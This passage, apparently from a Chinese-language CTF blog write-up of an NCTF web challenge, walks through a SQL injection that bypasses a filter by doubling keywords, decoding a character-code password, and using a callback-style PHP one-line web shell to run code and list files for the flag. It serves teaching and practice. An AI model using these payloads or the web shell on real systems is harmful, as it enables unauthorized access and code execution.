</figure><p>库名为sae-exploitblog</p><p>根据之前说明文本的提示表admin的结构</p><p>soid=0/<strong>/uunionnion/</strong>/sselectelect/<strong>/1,(sselectelect/</strong>/usernnameame/<strong>/ffromrom/</strong>/aadmindmin),(sselectelect/<strong>/userppassass/</strong>/ffromrom/**/aadmindmin),4</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/49.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注出用户名admin和密码102 117 99 107 114 117 110 116 117</p><p>这里密码还经过函数antixss处理过，保险起见还是再读取一下antixss.php的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function antixss($content)&#123;</span><br><span class="line">preg_match(&quot;/(.*)\[a\](.*)\[\/a\](.*)/&quot;,$content,$url);</span><br><span class="line">$key=array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;\\&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;&apos;&quot;,&quot;%28&quot;,&quot;%29&quot;,&quot; on&quot;,&quot;data&quot;,&quot;src&quot;,&quot;eval&quot;,&quot;unescape&quot;,&quot;innerHTML&quot;,&quot;document&quot;,&quot;appendChild&quot;,&quot;createElement&quot;,&quot;write&quot;,&quot;String&quot;,&quot;setTimeout&quot;,&quot;cookie&quot;);//å ä¸ºå¤ªèï¼å¾æï¼æä»¥ããã(è¿æ»¤è§åæ¥èªMramydnei)</span><br><span class="line">$re=$url[2];</span><br><span class="line">if(count($url)==0)&#123;</span><br><span class="line">return htmlspecialchars($content);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">for($i=0;$i&lt;=count($key);$i++)&#123;</span><br><span class="line">$re=str_replace($key[$i], &apos;_&apos;,$re);</span><br><span class="line">&#125;</span><br><span class="line">return htmlspecialchars($url[1],ENT_QUOTES).&apos;&lt;a href=&quot;&apos;.$re.&apos;&quot;&gt;&apos;.$re.&apos;&lt;/a&gt;&apos;.htmlspecialchars($url[3],ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>大概是过滤一些html标签关键字，我们注出的密码应该只是经过 htmlspecialchars函数处理，没有什么影响</p><p>那么得到用户名和密码，大概是要进入一个登陆界面</p><p>这时注意到about.php文件中过滤了关键字loginxlcteam</p><p>就试着访问<a href="http://cms.nuptzj.cn/loginxlcteam" target="_blank" rel="noopener">http://cms.nuptzj.cn/loginxlcteam</a></p><p>没想到就访问到了登陆界面</p><p>我们试着将注出的用户名和密码输入，提示错误</p><p>此时回去看看说明的文本，里面提示了密码加密文件passencode.php </p><p>猜测可能密码有经过加密，我们先读取passencode.php 源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function passencode($content)&#123;</span><br><span class="line">//$pass=urlencode($content);</span><br><span class="line">$array=str_split($content);</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;count($array);$i++)&#123;</span><br><span class="line">if($pass!=&quot;&quot;)&#123;</span><br><span class="line">$pass=$pass.&quot; &quot;.(string)ord($array[$i]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$pass=(string)ord($array[$i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $pass;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看了加密的源代码，很明显我们注出的密码102 117 99 107 114 117 110 116 117是经过加密的，我们根据加密的过程写出解密的过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function passdecode($pass)&#123;</span><br><span class="line">$arr = explode(&quot; &quot;,$pass);</span><br><span class="line">$content = &quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;count($arr);$i++)&#123;</span><br><span class="line">$content = $content.chr($arr[$i]);</span><br><span class="line">&#125;</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pass = &quot;102 117 99 107 114 117 110 116 117&quot;;</span><br><span class="line">$content = passdecode($pass);</span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行结果：fuckruntu</p><p>再次在登录界面输入用户名admin,密码fuckruntu</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/50.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示我们还差最后一步，并且提示将一句话木马放在网站根目录下的xlcteam.php文件中</p><p>既然在根目录下，我们还是可以在about.php中读取源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查询得到这是一个回调函数的一句话木马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/51.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们post参数www=preg_replace,wtf就是我们可以任意执行的命令</p><p>那么我们可以post参数wtf=print_r(scandir(‘./‘));</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/52.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现文件：恭喜你获得flag2.txt </p><p><img src="/img/nctf/53.png" alt=""></p><p>获得flag</p>]]></content>
    
    <summary type="html">
    
      nctf-Web
    
    </summary>
    
      <category term="nctf-Web" scheme="https://Foxgrin.github.io/categories/nctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
</feed>
